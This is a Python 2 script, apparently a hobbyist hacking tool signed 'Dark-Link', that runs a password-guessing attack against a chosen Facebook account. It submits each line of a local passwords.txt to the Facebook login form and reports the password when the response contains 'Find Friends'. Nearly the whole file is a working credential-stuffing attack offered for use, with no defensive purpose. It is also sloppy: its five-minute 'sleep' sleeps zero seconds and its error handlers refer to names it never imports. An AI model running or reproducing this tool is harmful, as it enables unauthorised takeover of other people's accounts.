import time
import sys

r = '\033[31;1m'
g = '\033[32;1m'
w = '\033[37;1m'

if sys.version_info[0] !=2:
	print (r + 'Sorry your' + w + ' Python version' + r + ' is not supprted')
	print (g + 'This program required in need' + w + ' Python v.2.x')
	print (g + 'Please intall first')
	sys.exit()

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
	import mechanize
	import urllib2
	browser = mechanize.Browser()
	browser.addheaders = [('User-Agent',headers['User-Agent'])]
	browser.set_handle_robots(False)
except ImportError:
	print (r + "\nModule 'Mechenize' is not exist")
	print (g + "Install" + w + " 'mechanize'" + g + " before you runing this program")
	sys.exit('\n')

try:
	print ('''
==========================================================
            WELCOME TO FACEBOOK BRUTE-FORCE
==========================================================
By: Dark-Link
Contact:
     undercore.dl@gmail.com
https://facebook.com/udrcr.darklink
==========================================================''')
	file=open('passwords.txt','r')

	print(' ')
	email=str(raw_input('Enter the E-Mail, Phone Number, ID, or Username of account taget \n ==>> ').strip())

	print ('\n Target Account: ',email)
	print ('\n Trying Password from list ...')

	i=0
	while file:
		passw=file.readline().strip()
		i+=1
		if len(passw) < 6:
			continue
		print str(i) +" : ",passw
		response = browser.open(post_url)
		try:
			if response.code == 200:
				browser.select_form(nr=0)
				browser.form['email'] = email
				browser.form['pass'] = passw
				response = browser.submit()
				if 'Find Friends' in response.read():
					print('Account password is: ',passw)
					break
		except:
			print('\nSleeping for time: 5 min\n')
			time.sleep(0)

except KeyboardInterrupt:
	print ("\n Stoped...")
	print ("User Interupt")
	sys.exit()
except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
	print (" Can't runing this program")
	print (" Ceck your Internet Connection")
except (URLError):
	print ("\n Can't running this prgram")
	print ("\n Ceck your Internet Connection")
	sys.exit()